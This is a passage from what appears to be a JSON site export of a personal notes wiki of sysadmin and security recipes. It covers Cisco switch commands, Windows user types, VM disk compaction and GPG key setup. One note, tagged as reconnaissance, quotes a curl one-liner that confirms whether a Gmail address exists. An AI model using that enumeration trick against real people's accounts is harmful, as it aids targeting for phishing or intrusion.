style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; interface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; brief&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;      # Interface overview&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; interface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NUM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;    # Detailed interface information&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; interfaces&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;  # Interface descriptions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; interfaces&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; status&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;       # Status of all interfaces&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; crypto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; mypubkey&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Current SSH public key&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dhcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; lease&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;              # Current DHCP status/information&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;######################&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Configuration mode #&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;######################&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;           # General configuration mode&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; interface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Interface configuration mode&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; line&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;      # Serial console configuration mode&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# General configuration commands&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hostname&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HOSTNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                 # Set switch hostname&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; secret&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $MD5_PASS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # Set password using MD5 hash &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;          # Set password using clear text&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;banner&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; motd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BANNER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                # Set login banner (use &quot;$&quot; like &quot;EOF&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; default-gateway&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # Set default gateway&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; running-config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; startup-config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Persiste current config&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Network interface configuration&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;interface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IFACE_TYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IFACE_NUM&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NETMASK&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Login (&quot;line&quot;) configuration - set console port&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;line&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; con&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;login&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Login (&quot;line&quot;) configuration - set terminal connections&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;config&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;line&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vty&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $VTTY_NUM&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;login&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Common-Windows-user-types":{"slug":"spells/Common-Windows-user-types","filePath":"spells/Common Windows user types.md","title":"Common Windows user types","links":[],"tags":["OS/Windows"],"content":"\nLocal Admin\nLocal User\nGuest User\nDomain User\nDomain Admin\n\nNote that non-admin domain users may still be local admins.","richContent":"&lt;ul&gt;\n&lt;li&gt;Local Admin&lt;/li&gt;\n&lt;li&gt;Local User&lt;/li&gt;\n&lt;li&gt;Guest User&lt;/li&gt;\n&lt;li&gt;Domain User&lt;/li&gt;\n&lt;li&gt;Domain Admin&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that non-admin domain users may still be local admins.&lt;/p&gt;"},"spells/Compact-VM-disk-images":{"slug":"spells/Compact-VM-disk-images","filePath":"spells/Compact VM disk images.md","title":"Compact VM disk images","links":[],"tags":["HowTo","Application/libVirt","Application/VirtualBox","OS/Windows","OS/Linux","Application/SDelete","Application/dd"],"content":"Note that disk images can only be compacted if they are not in a snapshot chain and do not use disk encryption!\nlibVirt\nvirt-sparsify --compress /path/to/image.qcow2 /path/to/new-image.qcow2\nVirtualBox\nWindows\nDisable the paging file (Settings → System → About → Advanced system settings → Advanced → Performance → Settings… → Advanced → Virtual memory → Change…), clean all temporary files (C: → Properties → Disk Cleanup), defrag (defrag C: /FreespaceConsolidate /Verbose), and then zero out free space with SDelete (sdelete -z C:).\nThen, compact the disk image on the host:\nvboxmanage modifymedium /path/to/image.vdi --compact\nRemember to turn the paging file back on after compacting the drive!\nLinux\nZero out free disk space on the guest:\nsudo dd if=/dev/zero of=/temp.zeros bs=4096k\nsudo rm -f /temp.zeros\nCompact the disk image on the host:\nvboxmanage modifymedium /path/to/image.vdi --compact","richContent":"&lt;p&gt;Note that disk images can only be compacted if they are &lt;em&gt;not&lt;/em&gt; in a snapshot chain and do &lt;em&gt;not&lt;/em&gt; use disk encryption!&lt;/p&gt;\n&lt;h2 id=&quot;libvirt&quot;&gt;libVirt&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#libvirt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;virt-sparsify&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --compress&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/image.qcow2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/new-image.qcow2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;virtualbox&quot;&gt;VirtualBox&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#virtualbox&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#windows&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Disable the paging file (&lt;strong&gt;Settings → System → About → Advanced system settings → Advanced → Performance → Settings… → Advanced → Virtual memory → Change…&lt;/strong&gt;), clean all temporary files (&lt;strong&gt;C: → Properties → Disk Cleanup&lt;/strong&gt;), defrag (&lt;code&gt;defrag C: /FreespaceConsolidate /Verbose&lt;/code&gt;), and then zero out free space with &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;SDelete&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (&lt;code&gt;sdelete -z C:&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;Then, compact the disk image on the host:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;vboxmanage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; modifymedium&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/image.vdi&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --compact&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Remember to turn the paging file back on after compacting the drive!&lt;/p&gt;\n&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#linux&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Zero out free disk space &lt;em&gt;on the guest&lt;/em&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; if=/dev/zero&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; of=/temp.zeros&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bs=4096k&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /temp.zeros&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Compact the disk image &lt;em&gt;on the host&lt;/em&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;vboxmanage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; modifymedium&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/image.vdi&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --compact&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Confirm-the-existence-of-a-Gmail-address":{"slug":"spells/Confirm-the-existence-of-a-Gmail-address","filePath":"spells/Confirm the existence of a Gmail address.md","title":"Confirm the existence of a Gmail address","links":[],"tags":["Application/curl","WebApplication/Gmail","HowTo","AttackCycle/Reconnaissance"],"content":"\nEasier way to confirm the existence of a gmail address. If an email address exists, it will send cookie in response.\ncurl -v &quot;mail.google.com/mail/gxlu${USER}@gmail.com&quot;\n— 7oaster on The OSINTion Discord\n","richContent":"&lt;blockquote&gt;\n&lt;p&gt;Easier way to confirm the existence of a gmail address. If an email address exists, it will send cookie in response.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;curl -v &quot;https://mail.google.com/mail/gxlu?email=${USER}@gmail.com&quot;&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;— &lt;a href=&quot;https://discord.com/channels/713982578692194389/756722804535066626/858536063769509889&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;7oaster on The OSINTion Discord&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/blockquote&gt;"},"spells/Create-a-GPG-key-with-SSH-support":{"slug":"spells/Create-a-GPG-key-with-SSH-support","filePath":"spells/Create a GPG key with SSH support.md","title":"Create a GPG Key (with SSH support!)","links":[],"tags":["Application/SSH","Application/GPG","HowTo"],"content":"The following is based on Creating newer ECC keys for GnuPG and OpenPGP Best Practices. The idea here is to create a locked-down set of single-purpose keys that are rotated once per year (the 13 month expiration provides a little bit of wiggle-room).\nCreate the initial key\ngpg --expert --full-generate-key\n\nChoose “ECC (set your own capabilities)”\nToggle the “Sign” capability off (S).\nFinish choosing capabilities (Q).\nChoose “Curve 25519”.\nExpire in 13 months (13m).\nEnter your name.\nEnter the primary email address for the key.\nDo not enter a comment.\n\nEdit the key\ngpg --expert --edit-key $KEYID\nAdd UIDs\n\nUse adduid.\nEnter your name.\nEnter the primary email address for the key.\nDo not enter a comment.\n\nAdd a signing subkey\n\nUse addkey.\nChoose “ECC (sign only)”\nChoose “Curve 25519”.\nExpire in 13 months (13m).\n\nAdd an authentication subkey\n\nUse addkey.\nChoose “ECC (set your own capabilities)”\nToggle the “Sign” capability off (S).\nToggle the “Authenticate” capability on (A).\nFinish choosing capabilities (Q).\nChoose “Curve 25519”.\nExpire in 13 months (13m).\n\nAdd an encryption subkey\n\nUse addkey.\nChoose “ECC (encrypt only)”\nChoose “Curve 25519”.\nExpire in 13 months (13m).\n\nFinish up\nBe sure to save the key before exiting.\nRemove the primary key for safe keeping\n# Export keys\n#\ngpg --armor --export-secret-key $KEYID &gt; $KEYID.asc\ngpg --export-secret-subkeys $KEYID &gt; subkeys.gpg\n \n# Delete secret keys (BOTH primary and subkeys)\n#\ngpg --delete-secret-keys $KEYID\n \n# Re-import secret subkeys\n#\ngpg --import subkeys.gpg\n \n# Optionally verify that eveything worked...\n#\ngpg --list-keys\ngpg --list-secret-keys\n \n# Cleanup\n#\nrm subkeys.gpg\nOnce this is done, $KEYID.asc can be stored “offline” on a secure (encrypted!) drive, etc. Note that this key will need to be re-imported to generate new subkeys, add UIDs, extend expiration dates, or create updated revocation certificates.\nExport the authentication subkey to SSH\n\nRun gpg --list-secret-keys --with-keygrip.\nCopy keygrips of the authentication subkeys (A) you want to use in SSH to ~/.gnupg/sshcontrol.\nGenerate the SSH public key using gpg --export-ssh-key $KEYID &gt; ~/.ssh/id_${KEYID}.pub. This key can then be referenced using the IdentityFile directive in ~/.ssh/config or inserted into a host’s ~/.ssh/authorized_keys file.\n","richContent":"&lt;p&gt;The following is based on &lt;a href=&quot;https://www.gniibe.org/memo/software/gpg/keygen-25519.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Creating newer ECC keys for GnuPG&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://riseup.net/en/security/message-security/openpgp/best-practices&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;OpenPGP Best Practices&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. The idea here is to create a locked-down set of 